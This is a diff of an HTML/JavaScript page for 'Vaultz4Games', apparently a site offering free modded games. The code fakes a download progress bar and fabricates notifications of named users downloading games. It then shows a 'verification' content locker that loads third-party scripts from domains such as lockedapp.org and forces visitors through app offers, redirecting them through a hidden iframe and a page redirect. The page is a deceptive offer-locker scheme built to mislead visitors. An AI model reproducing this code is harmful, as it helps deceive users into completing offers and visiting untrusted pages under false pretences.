@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -1108,7 +1109,6 @@
             </div>
         </div>
 
-        <!-- About Vaultz4Games in FAQ Section -->
         <div class="faq-item">
             <div class="faq-question" onclick="toggleFaq(this)">
                 About Vaultz4Games
@@ -1145,14 +1145,9 @@
             <div class="popup-details">
                 <h2 class="popup-title" id="popupTitle">Game Title</h2>
                 <p class="popup-description" id="popupDescription">Game description will appear here.</p>
-                <div class="popup-meta" id="popupMeta">
-                    <!-- Meta tags will be inserted here -->
-                </div>
-                <div class="popup-stats" id="popupStats">
-                    <!-- Stats will be inserted here -->
-                </div>
+                <div class="popup-meta" id="popupMeta"></div>
+                <div class="popup-stats" id="popupStats"></div>
                 
-                <!-- Platform Buttons for Demon Slayer -->
                 <div class="platform-buttons" id="platformButtons" style="display: none;">
                     <button class="platform-download-btn" onclick="startPlatformDownload('demon', 'mobile')">
                         <i class="fas fa-mobile-alt"></i> PPSSPP
@@ -1162,7 +1157,6 @@
                     </button>
                 </div>
                 
-                <!-- Platform Buttons for Multi-platform games -->
                 <div class="platform-buttons" id="platformButtonsMulti" style="display: none;">
                     <button class="platform-download-btn" onclick="startPlatformDownload(currentGameId, 'android')">
                         <i class="fab fa-android"></i> Android
@@ -1193,7 +1187,6 @@
                         </button>
                     </div>
                     
-                    <!-- How to Verify Section -->
                     <div class="how-to-verify" id="howToVerify">
                         <h3>How to Complete Verification</h3>
                         <div class="verify-steps">
@@ -1214,20 +1207,16 @@
                                 <div class="step-text">Return to this page and your game will unlock automatically</div>
                             </div>
                         </div>
-                        
                         <div class="verify-image">
-                            <!-- This would be your verification screenshot -->
                             <div style="background: #2a2d4a; padding: 20px; text-align: center; color: #1e90ff;">
                                 <i class="fas fa-mobile-alt" style="font-size: 40px; margin-bottom: 10px;"></i>
                                 <p>Verification Offers Example</p>
                                 <p style="font-size: 12px; color: #aaa; margin-top: 10px;">Choose any app offer to complete verification</p>
                             </div>
                         </div>
-                        
                         <div class="verify-tip">
                             💡 Tip: Choose the simplest offer for fastest verification!
                         </div>
-                        
                         <button class="verify-btn" onclick="hideHowToVerify()" style="width: 100%; margin-top: 15px;">
                             <i class="fas fa-arrow-left"></i> Back to Verification
                         </button>
@@ -1243,48 +1232,28 @@
 </div>
 
 <script>
-    // Browser Popup Functions
     function closeBrowserPopup() {
         document.getElementById('browserOverlay').style.display = 'none';
-        // Track popup close
         trackEvent('Browser Popup', 'Closed');
     }
 
-    // Auto close after 6 seconds
-    setTimeout(() => {
-        closeBrowserPopup();
-    }, 6000);
+    setTimeout(() => { closeBrowserPopup(); }, 6000);
 
-    // Close when clicking outside the popup
     document.getElementById('browserOverlay').addEventListener('click', function(e) {
-        if (e.target === this) {
-            closeBrowserPopup();
-        }
+        if (e.target === this) { closeBrowserPopup(); }
     });
 
-    // Track page views and user interactions
     function trackEvent(category, action, label) {
-        // This is where you would integrate with your analytics
         console.log(`Tracking: ${category} - ${action} - ${label}`);
-        
-        // Example: Send to Google Analytics (if implemented)
-        // gtag('event', action, {
-        //     'event_category': category,
-        //     'event_label': label
-        // });
     }
 
-    // Game data - optimized for performance
     const gameData = {
         'highwayracer': {
             title: 'Highway Racer Pro',
             image: 'https://play-lh.googleusercontent.com/jW79FoXH3pHq0uxKlgBZh2sG15xF0zEBpf9_xHEoqe9f05mVFhujpP58s02ZqAwj6zc=w240-h480-rw',
             description: 'Experience the ultimate racing thrill in Highway Racer Pro. Compete in high-speed races, customize your vehicles, and dominate the highways in this action-packed racing game.',
             meta: ['Mobile', 'Racing', 'Action'],
-            stats: {
-                downloads: '1.2M+',
-                rating: '4.7'
-            },
+            stats: { downloads: '1.2M+', rating: '4.7' },
             androidScript: 'https://lockedapp.org/cl/js/j76p4n',
             iosScript: 'https://redirectapps.online/cl/js/l7kpvd',
             hasMultiPlatforms: true
@@ -1294,10 +1263,7 @@
             image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQfsfPFRQSX8xm_Oe-cf4a10rACtSs23ovRTQ&s',
             description: 'Become a demon slayer and fight against powerful demons in this action RPG. Available for both PC and Mobile (PPSSPP). Follow Tanjiro\'s journey to save his sister and avenge his family.',
             meta: ['PC/Mobile', 'Action RPG', 'Anime'],
-            stats: {
-                downloads: '3.0M+',
-                rating: '4.6'
-            },
+            stats: { downloads: '3.0M+', rating: '4.6' },
             mobileScript: 'https://applocked.org/cl/js/qnern3',
             pcScript: 'https://pagelocked.org/cl/js/n625kv',
             hasPlatforms: true
@@ -1307,10 +1273,7 @@
             image: 'https://play-lh.googleusercontent.com/nY6KhEkl64SudLvb2dwHP-pg4edvjegZnW9fIWaL8FFlEUq2LZKpseanjJtA_uJk4K0c',
             description: 'Experience the epic story of Naruto in this action-packed adventure game. Relive key moments from the anime and master powerful jutsus.',
             meta: ['Mobile', 'MOD', 'Action'],
-            stats: {
-                downloads: '3.2M+',
-                rating: '4.9'
-            },
+            stats: { downloads: '3.2M+', rating: '4.9' },
             script: 'https://lockverify.org/cl/js/grq5qp'
         },
         'gtamobile': {
@@ -1318,10 +1281,7 @@
             image: 'https://img.utdstc.com/icon/d45/de4/d45de47f27a8471894c3465c1cd8516cc8aea333bf7a27b1291cb9ecca45172f:200',
             description: 'Experience the thrill of Grand Theft Auto on your mobile device. Explore vast cities, complete missions, and enjoy the open-world gameplay that made GTA famous.',
             meta: ['Mobile', 'Action', 'Open World'],
-            stats: {
-                downloads: '4.2M+',
-                rating: '4.8'
-            },
+            stats: { downloads: '4.2M+', rating: '4.8' },
             androidScript: 'https://lockedapp.org/cl/js/j76owp',
             iosScript: 'https://lockedapp.org/cl/js/xp63kg',
             hasMultiPlatforms: true
@@ -1331,21 +1291,15 @@
             image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSXPJhCFOJULzIUzs73fM2A8yGioOy2xOSSZQ&s',
             description: 'An action-packed, fast-paced mobile gaming experience where rhythm meets strategy. Players dive into dynamic levels filled with music-driven combat, smooth animations, and futuristic environments.',
             meta: ['Mobile', 'Rhythm', 'Action'],
-            stats: {
-                downloads: '1.8M+',
-                rating: '4.9'
-            },
+            stats: { downloads: '1.8M+', rating: '4.9' },
             script: 'https://lockverify.org/cl/js/6n74wm'
         },
         'spiderfuser': {
-            title: 'Spider Fuser',
-            image: 'https://play-lh.googleusercontent.com/DTBOpmXf2zJHVxOCjSPMPIJHRdTupGdm30JXca40HugEwurjN_AFIxFxpn5UKzaB9OP3tohDTojBwYEO5vdkOUE=w240-h480-rw',
+            title: 'Spider Man 2',
+            image: 'https://imgs.search.brave.com/FcxyTyENP8bmB4-TT_SMVGJqznbWlr6KzojE8Q3CUIk/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9zdHls/ZXMucmVkZGl0bWVk/aWEuY29tL3Q1XzNm/bWpoL3N0eWxlcy9j/b21tdW5pdHlJY29u/X3BodzhzZnNuMWVi/YzEucG5n',
             description: 'An exciting action game where you play as a spider hero with unique fusion abilities. Swing through the city, fight villains, and fuse powers to become stronger.',
             meta: ['Mobile', 'Action', 'Superhero'],
-            stats: {
-                downloads: '1.2M+',
-                rating: '4.7'
-            },
+            stats: { downloads: '1.2M+', rating: '4.7' },
             androidScript: 'https://lockedapp.org/cl/js/9v99lg',
             iosScript: 'https://appverification.live/cl/js/w6ooxv',
             hasMultiPlatforms: true
@@ -1355,10 +1309,7 @@
             image: 'https://play-lh.googleusercontent.com/IoK2XgbdDl3t1Yvv-oTVnQpD6Zv9p9EdScZSnIUJecEZ7fkdeO917O5eqpeayGUNrA=w240-h480-rw',
             description: 'Immerse yourself in a fiery paradise where adventure meets action. Explore stunning environments, battle epic bosses, and unlock powerful abilities in this Android-exclusive gaming experience.',
             meta: ['Android', 'Action', 'Adventure'],
-            stats: {
-                downloads: '1.3M+',
-                rating: '4.7'
-            },
+            stats: { downloads: '1.3M+', rating: '4.7' },
             script: 'https://redirectapps.online/cl/js/1xomqx'
         },
         'csr2': {
@@ -1366,10 +1317,7 @@
             image: 'https://yt3.googleusercontent.com/kLMc1a8X-GExoMaOW8qrL6I_v2z2ynEUfe__WoN0lf4tTOn1XUSgZSShxugsxlvYsKTX9kY8=s900-c-k-c0x00ffffff-no-rj',
             description: 'Experience the next generation of CSR Racing with CSR 2. Race with hyper-real cars, customize them to your style, and compete in intense multiplayer races.',
             meta: ['Mobile', 'Racing', 'Multiplayer'],
-            stats: {
-                downloads: '2.5M+',
-                rating: '4.8'
-            },
+            stats: { downloads: '2.5M+', rating: '4.8' },
             androidScript: 'https://applocked.org/cl/js/j76pdn',
             iosScript: 'https://redirectapps.org/cl/js/l7kpdd',
             hasMultiPlatforms: true
@@ -1379,10 +1327,7 @@
             image: 'https://apkbomb.com/wp-content/uploads/2025/02/IMG_20250226_204848_167-1.jpg',
             description: 'A thrilling stealth action game where you play as an assassin in ancient times. Use stealth and assassination techniques to eliminate targets.',
             meta: ['PC', 'Stealth', 'Action'],
-            stats: {
-                downloads: '890K+',
-                rating: '4.4'
-            },
+            stats: { downloads: '890K+', rating: '4.4' },
             script: 'https://lockedapp.org/cl/js/34oqgn'
         },
         'solo': {
@@ -1390,10 +1335,7 @@
             image: 'https://pbs.twimg.com/profile_images/1745332973048823808/dGTiGdtw_400x400.jpg',
             description: 'Become the world\'s strongest hunter in this action RPG based on the popular webtoon. Level up your character and battle terrifying monsters.',
             meta: ['PC/Mobile', 'MOD', 'RPG'],
-            stats: {
-                downloads: '1.5M+',
-                rating: '4.9'
-            },
+            stats: { downloads: '1.5M+', rating: '4.9' },
             script: 'https://applocked.org/cl/js/n623pk'
         },
         'onepiece': {
@@ -1401,10 +1343,7 @@
             image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTMHw_2cgPjz9I9BNlTa_uQBs0-AK_pHjiq3Q&s',
             description: 'Join the Straw Hat crew in this exciting pirate adventure game. Battle other pirates and collect treasure in this action-packed mobile game.',
             meta: ['Mobile', 'MOD', 'Adventure'],
-            stats: {
-                downloads: '2.1M+',
-                rating: '4.6'
-            },
+            stats: { downloads: '2.1M+', rating: '4.6' },
             script: 'https://lockverify.org/cl/js/1x581p'
         },
         'animebattle': {
@@ -1412,10 +1351,7 @@
             image: 'https://i.ytimg.com/vi/btgqblq80FU/maxresdefault.jpg',
             description: 'Fight with your favorite anime characters in this epic battle royale game. Experience intense battles with characters from various anime series in a massive multiplayer arena.',
             meta: ['Mobile', 'Action', 'Battle Royale'],
-            stats: {
-                downloads: '2.4M+',
-                rating: '4.8'
-            },
+            stats: { downloads: '2.4M+', rating: '4.8' },
             script: 'https://applocked.org/cl/js/9vq61g'
         },
         'iamacat': {
@@ -1423,10 +1359,7 @@
             image: 'https://play-lh.googleusercontent.com/qPz2598bkAbZKDV5tm6-nt0xJdTeSp9rcw-msxEZAYUrvdEtHM82lknNWYsNY2FB_Q',
             description: 'Experience life as a cat in this unique simulation game. Explore, play, and interact with your environment in this charming adventure.',
             meta: ['Mobile', 'Simulation', 'Adventure'],
-            stats: {
-                downloads: '1.1M+',
-                rating: '4.6'
-            },
+            stats: { downloads: '1.1M+', rating: '4.6' },
             androidScript: 'https://lockedapp.org/cl/js/kr7dj9',
             iosScript: 'https://lockedapp.org/cl/js/n62l9k',
             hasMultiPlatforms: true
@@ -1436,46 +1369,21 @@
             image: 'https://play-lh.googleusercontent.com/TqN6BNlAwfE1Npkc5UIXYagv-tlkrsOvM2FRXIcUVtxFWMGsfQYCxKfY-QXT0QNYeaA',
             description: 'An exciting new gaming experience with stunning graphics and immersive gameplay.',
             meta: ['Mobile', 'Action', 'Adventure'],
-            stats: {
-                downloads: '1.7M+',
-                rating: '4.7'
-            },
+            stats: { downloads: '1.7M+', rating: '4.7' },
             androidScript: 'https://redirectapps.org/cl/js/1xo2ld',
             iosScript: 'https://redirectapps.org/cl/js/4o25wj',
             hasMultiPlatforms: true
         }
     };
 
-    // Featured mods data
     const featuredMods = [
-        {
-            id: 'highwayracer',
-            name: 'Highway Racer Pro',
-            image: 'https://play-lh.googleusercontent.com/jW79FoXH3pHq0uxKlgBZh2sG15xF0zEBpf9_xHEoqe9f05mVFhujpP58s02ZqAwj6zc=w240-h480-rw'
-        },
-        {
-            id: 'demon',
-            name: 'Demon Slayer',
-            image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQfsfPFRQSX8xm_Oe-cf4a10rACtSs23ovRTQ&s'
-        },
-        {
-            id: 'naruto',
-            name: 'Naruto Ultimate Ninja Storm',
-            image: 'https://play-lh.googleusercontent.com/nY6KhEkl64SudLvb2dwHP-pg4edvjegZnW9fIWaL8FFlEUq2LZKpseanjJtA_uJk4K0c'
-        },
-        {
-            id: 'spiderfuser',
-            name: 'Spider Fuser',
-            image: 'https://play-lh.googleusercontent.com/DTBOpmXf2zJHVxOCjSPMPIJHRdTupGdm30JXca40HugEwurjN_AFIxFxpn5UKzaB9OP3tohDTojBwYEO5vdkOUE=w240-h480-rw'
-        },
-        {
-            id: 'gtamobile',
-            name: 'GTA Mobile',
-            image: 'https://img.utdstc.com/icon/d45/de4/d45de47f27a8471894c3465c1cd8516cc8aea333bf7a27b1291cb9ecca45172f:200'
-        }
+        { id: 'highwayracer', name: 'Highway Racer Pro', image: 'https://play-lh.googleusercontent.com/jW79FoXH3pHq0uxKlgBZh2sG15xF0zEBpf9_xHEoqe9f05mVFhujpP58s02ZqAwj6zc=w240-h480-rw' },
+        { id: 'demon', name: 'Demon Slayer', image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQfsfPFRQSX8xm_Oe-cf4a10rACtSs23ovRTQ&s' },
+        { id: 'naruto', name: 'Naruto Ultimate Ninja Storm', image: 'https://play-lh.googleusercontent.com/nY6KhEkl64SudLvb2dwHP-pg4edvjegZnW9fIWaL8FFlEUq2LZKpseanjJtA_uJk4K0c' },
+        { id: 'spiderfuser', name: 'Spider Man 2', image: 'https://imgs.search.brave.com/FcxyTyENP8bmB4-TT_SMVGJqznbWlr6KzojE8Q3CUIk/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9zdHls/ZXMucmVkZGl0bWVk/aWEuY29tL3Q1XzNm/bWpoL3N0eWxlcy9j/b21tdW5pdHlJY29u/X3BodzhzZnNuMWVi/YzEucG5n' },
+        { id: 'gtamobile', name: 'GTA Mobile', image: 'https://img.utdstc.com/icon/d45/de4/d45de47f27a8471894c3465c1cd8516cc8aea333bf7a27b1291cb9ecca45172f:200' }
     ];
 
-    // Download notifications data
     const downloadNotifications = [
         { name: 'Emma', game: 'Demon Slayer PPSSPP', initial: 'E' },
         { name: 'James', game: 'Naruto Ultimate Ninja Storm', initial: 'J' },
@@ -1485,7 +1393,7 @@
         { name: 'Noah', game: 'The Infernus Paradise', initial: 'N' },
         { name: 'Ava', game: 'CSR 2', initial: 'A' },
         { name: 'David', game: 'Solo Leveling Arise', initial: 'D' },
-        { name: 'Mia', game: 'Spider Fuser', initial: 'M' },
+        { name: 'Mia', game: 'Spider Man 2', initial: 'M' },
         { name: 'Ethan', game: 'One Piece', initial: 'E' },
         { name: 'Alex', game: 'Anime Battle Royal', initial: 'A' },
         { name: 'Lucas', game: 'Clash of Scary Squad', initial: 'L' }
@@ -1495,7 +1403,6 @@
     let currentPlatform = 'mobile';
     let notificationInterval;
 
-    // How to Verify functions
     function showHowToVerify() {
         document.getElementById('popupVerify').style.display = 'none';
         document.getElementById('howToVerify').classList.add('active');
@@ -1507,115 +1414,68 @@
         document.getElementById('popupVerify').style.display = 'block';
     }
 
-    // Initialize featured mods
     function initFeaturedMods() {
         const slider = document.getElementById('modsSlider');
         slider.innerHTML = '';
-        
         featuredMods.forEach(mod => {
             const modElement = document.createElement('div');
             modElement.className = 'featured-mod';
-            modElement.onclick = () => {
-                trackEvent('Featured Mod', 'Click', mod.name);
-                showGamePopup(mod.id);
-            };
-            modElement.innerHTML = `
-                <img src="${mod.image}" alt="${mod.name}" loading="lazy">
-                <h3>${mod.name}</h3>
-            `;
+            modElement.onclick = () => { trackEvent('Featured Mod', 'Click', mod.name); showGamePopup(mod.id); };
+            modElement.innerHTML = `<img src="${mod.image}" alt="${mod.name}" loading="lazy"><h3>${mod.name}</h3>`;
             slider.appendChild(modElement);
         });
     }
 
-    // Initialize games grid
     function initGamesGrid() {
         const gameGrid = document.getElementById('gameGrid');
         gameGrid.innerHTML = '';
-        
-        const gameOrder = [
-            'highwayracer', 'demon', 'naruto', 'gtamobile', 
-            'projectjazz', 'spiderfuser', 'infernusparadise', 'csr2', 
-            'hiddenones', 'solo', 'onepiece', 'animebattle', 'newgame'
-        ];
-        
+        const gameOrder = ['highwayracer','demon','naruto','gtamobile','projectjazz','spiderfuser','infernusparadise','csr2','hiddenones','solo','onepiece','animebattle','newgame'];
         gameOrder.forEach(gameId => {
             const game = gameData[gameId];
             const gameElement = document.createElement('div');
             gameElement.className = 'game-icon';
-            gameElement.onclick = () => {
-                trackEvent('Game Grid', 'Click', game.title);
-                showGamePopup(gameId);
-            };
-            
+            gameElement.onclick = () => { trackEvent('Game Grid', 'Click', game.title); showGamePopup(gameId); };
             let platformIcons = '';
             if (game.hasMultiPlatforms || gameId === 'spiderfuser' || gameId === 'gtamobile' || gameId === 'highwayracer' || gameId === 'csr2' || gameId === 'newgame') {
-                platformIcons = `
-                    <div class="platform-icons">
-                        <i class="fab fa-android platform-icon"></i>
-                        <i class="fab fa-apple platform-icon"></i>
-                    </div>
-                `;
+                platformIcons = `<div class="platform-icons"><i class="fab fa-android platform-icon"></i><i class="fab fa-apple platform-icon"></i></div>`;
             } else if (gameId === 'infernusparadise') {
-                platformIcons = `
-                    <div class="platform-icons">
-                        <i class="fab fa-android platform-icon"></i>
-                    </div>
-                `;
+                platformIcons = `<div class="platform-icons"><i class="fab fa-android platform-icon"></i></div>`;
             }
-            
             gameElement.innerHTML = `
-                <div class="game-icon-image">
-                    <img src="${game.image}" alt="${game.title}" loading="lazy">
-                </div>
+                <div class="game-icon-image"><img src="${game.image}" alt="${game.title}" loading="lazy"></div>
                 ${platformIcons}
                 <div class="game-icon-title">${game.title}</div>
                 <div class="game-stats">
-                    <div class="download-count">
-                        <i class="fas fa-download"></i>
-                        <span>${game.stats.downloads}</span>
-                    </div>
-                    <div class="rating">
-                        <span class="star">${game.stats.rating >= 4.5 ? '★★★★★' : '★★★★☆'}</span>
-                    </div>
+                    <div class="download-count"><i class="fas fa-download"></i><span>${game.stats.downloads}</span></div>
+                    <div class="rating"><span class="star">${game.stats.rating >= 4.5 ? '★★★★★' : '★★★★☆'}</span></div>
                 </div>
                 <button class="download-btn" onclick="event.stopPropagation(); trackEvent('Game Grid', 'Download Click', '${game.title}'); downloadGameFromHome('${gameId}')">
                     <i class="fas fa-download"></i> Download
-                </button>
-            `;
+                </button>`;
             gameGrid.appendChild(gameElement);
         });
     }
 
-    // Show download notification
     function showDownloadNotification() {
         const notification = document.getElementById('downloadNotification');
         const userAvatar = document.getElementById('userAvatar');
         const userName = document.getElementById('userName');
         const gameName = document.getElementById('gameName');
-        
         const randomNotification = downloadNotifications[Math.floor(Math.random() * downloadNotifications.length)];
-        
         userAvatar.textContent = randomNotification.initial;
         userName.textContent = randomNotification.name;
         gameName.textContent = randomNotification.game;
-        
         notification.classList.add('active');
-        
-        setTimeout(() => {
-            notification.classList.remove('active');
-        }, 5000);
+        setTimeout(() => { notification.classList.remove('active'); }, 5000);
     }
 
     function showGamePopup(gameId) {
         currentGameId = gameId;
         const game = gameData[gameId];
-        
         if (game) {
             document.getElementById('popupImage').src = game.image;
             document.getElementById('popupTitle').textContent = game.title;
             document.getElementById('popupDescription').textContent = game.description;
-            
-            // Set meta tags
             const metaContainer = document.getElementById('popupMeta');
             metaContainer.innerHTML = '';
             game.meta.forEach(tag => {
@@ -1624,30 +1484,17 @@
                 span.textContent = tag;
                 metaContainer.appendChild(span);
             });
-            
-            // Set stats
             const statsContainer = document.getElementById('popupStats');
             statsContainer.innerHTML = '';
-            const stats = [
-                { value: game.stats.downloads, label: 'Downloads' },
-                { value: game.stats.rating, label: 'Rating' }
-            ];
-            
-            stats.forEach(stat => {
+            [{ value: game.stats.downloads, label: 'Downloads' }, { value: game.stats.rating, label: 'Rating' }].forEach(stat => {
                 const div = document.createElement('div');
                 div.className = 'popup-stat';
-                div.innerHTML = `
-                    <div class="popup-stat-value">${stat.value}</div>
-                    <div class="popup-stat-label">${stat.label}</div>
-                `;
+                div.innerHTML = `<div class="popup-stat-value">${stat.value}</div><div class="popup-stat-label">${stat.label}</div>`;
                 statsContainer.appendChild(div);
             });
-            
-            // Show platform buttons for Demon Slayer
             const platformButtons = document.getElementById('platformButtons');
             const platformButtonsMulti = document.getElementById('platformButtonsMulti');
             const regularDownload = document.getElementById('regularDownload');
-            
             if (game.hasPlatforms) {
                 platformButtons.style.display = 'flex';
                 platformButtonsMulti.style.display = 'none';
@@ -1661,74 +1508,39 @@
                 platformButtonsMulti.style.display = 'none';
                 regularDownload.style.display = 'block';
             }
-            
-            // Reset download sections
             document.getElementById('popupProgress').style.display = 'none';
             document.getElementById('popupVerify').style.display = 'none';
             document.getElementById('popupLocker').style.display = 'none';
             document.getElementById('howToVerify').classList.remove('active');
             document.getElementById('popupLocker').innerHTML = '<div class="locker-placeholder">Complete verification to download...</div>';
-            
-            // Show popup
             document.getElementById('gamePopup').classList.add('active');
-            
-            // Track popup view
             trackEvent('Game Popup', 'View', game.title);
         }
     }
 
-    // Download game from home menu
     function downloadGameFromHome(gameId) {
-        // First show the game popup
         showGamePopup(gameId);
-        
-        // Then start the download process after a short delay
-        setTimeout(() => {
-            downloadGame(gameId);
-        }, 500);
+        setTimeout(() => { downloadGame(gameId); }, 500);
     }
 
-    // Start platform download
     function startPlatformDownload(gameId, platform) {
         currentPlatform = platform;
         trackEvent('Platform Selection', 'Click', `${gameData[gameId].title} - ${platform}`);
-        
-        // Hide platform buttons
         document.getElementById('platformButtons').style.display = 'none';
         document.getElementById('platformButtonsMulti').style.display = 'none';
-        
-        // Show regular download section
         document.getElementById('regularDownload').style.display = 'block';
-        
-        // Start the download process
         downloadGame(gameId);
     }
 
     function downloadGame(gameId) {
         trackEvent('Download', 'Start', gameData[gameId].title);
-        
-        // Show installation progress
         const progressSection = document.getElementById('popupProgress');
         progressSection.style.display = 'block';
-        
-        // Animate progress bar with variable speed
         const progressFill = progressSection.querySelector('.progress-fill');
         progressFill.style.width = '0%';
-        
-        // Variable speed progress animation (fast-slow-fast)
-        setTimeout(() => {
-            progressFill.style.width = '40%'; // Fast to 40%
-        }, 300);
-        
-        setTimeout(() => {
-            progressFill.style.width = '60%'; // Slower from 40% to 60%
-        }, 1500);
-        
-        setTimeout(() => {
-            progressFill.style.width = '100%'; // Fast finish from 60% to 100%
-        }, 2500);
-        
-        // After progress complete, show verify section
+        setTimeout(() => { progressFill.style.width = '40%'; }, 300);
+        setTimeout(() => { progressFill.style.width = '60%'; }, 1500);
+        setTimeout(() => { progressFill.style.width = '100%'; }, 2500);
         setTimeout(() => {
             progressSection.style.display = 'none';
             const verifySection = document.getElementById('popupVerify');
@@ -1739,119 +1551,61 @@
 
     function showContentLocker(gameId, platform) {
         trackEvent('Verification', 'Start', `${gameData[gameId].title} - ${platform}`);
-        
-        // Hide verify section
         document.getElementById('popupVerify').style.display = 'none';
         document.getElementById('howToVerify').classList.remove('active');
-        
-        // Show content locker
         const contentLocker = document.getElementById('popupLocker');
         contentLocker.style.display = 'block';
-        
-        // Clear previous content
         contentLocker.innerHTML = '<div class="locker-placeholder"><div class="loading"></div> Loading verification...</div>';
-        
-        // Create and load the script
         const script = document.createElement('script');
         script.type = 'text/javascript';
         script.id = 'ogjs';
-        
-        // Determine which script to load based on platform
         const game = gameData[gameId];
         let scriptUrl = game.script;
-        
         if (gameId === 'demon' && game.hasPlatforms) {
             scriptUrl = platform === 'mobile' ? game.mobileScript : game.pcScript;
         } else if ((game.hasMultiPlatforms || gameId === 'spiderfuser' || gameId === 'gtamobile' || gameId === 'highwayracer' || gameId === 'csr2' || gameId === 'newgame') && (platform === 'android' || platform === 'ios')) {
             scriptUrl = platform === 'android' ? game.androidScript : game.iosScript;
         }
-        
         script.src = scriptUrl;
-        
-        // Add error handling for script loading
         script.onerror = function() {
             contentLocker.innerHTML = '<div class="locker-placeholder">Error loading verification. Please try again.</div>';
             trackEvent('Verification', 'Script Error', `${game.title} - ${platform}`);
         };
-        
         script.onload = function() {
             trackEvent('Verification', 'Script Loaded', `${game.title} - ${platform}`);
-            
-            // Check if the content locker script has initialized properly
             setTimeout(() => {
                 if (contentLocker.innerHTML.includes('locker-placeholder')) {
-                    // If content locker didn't load properly, try alternative approach
-                    contentLocker.innerHTML = `
-                        <div style="text-align: center; padding: 20px;">
-                            <h3 style="color: #1e90ff; margin-bottom: 15px;">Complete Verification</h3>
-                            <p style="margin-bottom: 15px;">Please complete the verification to download ${game.title}</p>
-                            <button class="verify-btn" onclick="completeVerification('${gameId}', '${platform}')">Complete Verification</button>
-                        </div>
-                    `;
+                    contentLocker.innerHTML = `<div style="text-align: center; padding: 20px;"><h3 style="color: #1e90ff; margin-bottom: 15px;">Complete Verification</h3><p style="margin-bottom: 15px;">Please complete the verification to download ${game.title}</p><button class="verify-btn" onclick="completeVerification('${gameId}', '${platform}')">Complete Verification</button></div>`;
                 }
             }, 3000);
         };
-        
-        // Add the script to the locker
         contentLocker.appendChild(script);
-        
-        // Show download notification
         setTimeout(showDownloadNotification, 15000);
     }
 
-    // Alternative verification completion function
     function completeVerification(gameId, platform) {
         trackEvent('Verification', 'Complete', `${gameData[gameId].title} - ${platform}`);
-        
         const contentLocker = document.getElementById('popupLocker');
-        contentLocker.innerHTML = `
-            <div style="text-align: center; padding: 20px;">
-                <h3 style="color: #1e90ff; margin-bottom: 15px;">Verification Complete!</h3>
-                <p style="margin-bottom: 15px;">Thank you for verifying. Your download will start shortly.</p>
-                <div class="loading" style="margin: 0 auto;"></div>
-            </div>
-        `;
-        
-        // Redirect to offer after verification
-        setTimeout(() => {
-            redirectToOffer(gameId, platform);
-        }, 2000);
+        contentLocker.innerHTML = `<div style="text-align: center; padding: 20px;"><h3 style="color: #1e90ff; margin-bottom: 15px;">Verification Complete!</h3><p style="margin-bottom: 15px;">Thank you for verifying. Your download will start shortly.</p><div class="loading" style="margin: 0 auto;"></div></div>`;
+        setTimeout(() => { redirectToOffer(gameId, platform); }, 2000);
     }
 
-    // Function to redirect to the offer after verification
     function redirectToOffer(gameId, platform) {
         trackEvent('Redirect', 'Offer', `${gameData[gameId].title} - ${platform}`);
-        
-        // Get the appropriate script URL
         const game = gameData[gameId];
         let scriptUrl = game.script;
-        
         if (gameId === 'demon' && game.hasPlatforms) {
             scriptUrl = platform === 'mobile' ? game.mobileScript : game.pcScript;
         } else if ((game.hasMultiPlatforms || gameId === 'spiderfuser' || gameId === 'gtamobile' || gameId === 'highwayracer' || gameId === 'csr2' || gameId === 'newgame') && (platform === 'android' || platform === 'ios')) {
             scriptUrl = platform === 'android' ? game.androidScript : game.iosScript;
         }
-        
-        // Create a hidden iframe to load the offer
         const iframe = document.createElement('iframe');
         iframe.style.display = 'none';
         iframe.src = scriptUrl.replace('/js/', '/').replace('.js', '');
         document.body.appendChild(iframe);
-        
-        // Also try to redirect the main window as a fallback
-        setTimeout(() => {
-            window.location.href = scriptUrl.replace('/js/', '/').replace('.js', '');
-        }, 1000);
-        
-        // Show success message
+        setTimeout(() => { window.location.href = scriptUrl.replace('/js/', '/').replace('.js', ''); }, 1000);
         const contentLocker = document.getElementById('popupLocker');
-        contentLocker.innerHTML = `
-            <div style="text-align: center; padding: 20px;">
-                <h3 style="color: #1e90ff; margin-bottom: 15px;">Redirecting to Download...</h3>
-                <p style="margin-bottom: 15px;">Please wait while we redirect you to the download page.</p>
-                <div class="loading" style="margin: 0 auto;"></div>
-            </div>
-        `;
+        contentLocker.innerHTML = `<div style="text-align: center; padding: 20px;"><h3 style="color: #1e90ff; margin-bottom: 15px;">Redirecting to Download...</h3><p style="margin-bottom: 15px;">Please wait while we redirect you to the download page.</p><div class="loading" style="margin: 0 auto;"></div></div>`;
     }
 
     function goHome() {
@@ -1869,66 +1623,37 @@
         const faqItem = element.parentElement;
         const isOpening = !faqItem.classList.contains('active');
         faqItem.classList.toggle('active');
-        
-        if (isOpening) {
-            const question = element.textContent.trim();
-            trackEvent('FAQ', 'Expand', question);
-        }
+        if (isOpening) { trackEvent('FAQ', 'Expand', element.textContent.trim()); }
     }
 
-    // Search functionality
     function filterGames() {
         const input = document.getElementById('searchInput');
         const filter = input.value.toLowerCase();
-        const gameIcons = document.querySelectorAll('.game-icon');
-        
-        gameIcons.forEach(icon => {
+        document.querySelectorAll('.game-icon').forEach(icon => {
             const title = icon.querySelector('.game-icon-title').textContent.toLowerCase();
-            if (title.includes(filter)) {
-                icon.style.display = 'flex';
-            } else {
-                icon.style.display = 'none';
-            }
+            icon.style.display = title.includes(filter) ? 'flex' : 'none';
         });
-        
-        if (filter.length > 0) {
-            trackEvent('Search', 'Query', filter);
-        }
+        if (filter.length > 0) { trackEvent('Search', 'Query', filter); }
     }
 
-    // Close popup when clicking outside
     document.getElementById('gamePopup').addEventListener('click', function(e) {
-        if (e.target === this) {
-            closeGamePopup();
-        }
+        if (e.target === this) { closeGamePopup(); }
     });
 
-    // Close popup with Escape key
     document.addEventListener('keydown', function(e) {
-        if (e.key === 'Escape') {
-            closeGamePopup();
-        }
+        if (e.key === 'Escape') { closeGamePopup(); }
     });
 
-    // Initialize the page
     document.addEventListener('DOMContentLoaded', function() {
-        // Track page view
         trackEvent('Page', 'View', 'Homepage');
-        
         initFeaturedMods();
         initGamesGrid();
-        
-        // Start showing download notifications every 20 seconds
